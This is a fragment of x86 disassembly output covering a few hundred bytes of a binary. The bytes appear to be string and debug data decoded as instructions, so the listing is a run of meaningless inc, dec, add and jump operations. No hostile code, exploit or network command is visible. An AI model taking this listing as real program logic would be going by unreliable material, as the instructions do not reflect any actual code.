  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	pop    ecx
  42ab59:	fisttp WORD PTR [ebx-0x2fcd683c]
  42ab5f:	inc    ecx
  42ab60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab61:	mov    bh,0x72
  42ab63:	jl     0x42ab7f
  42ab65:	mov    esi,0x1c9cfa
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
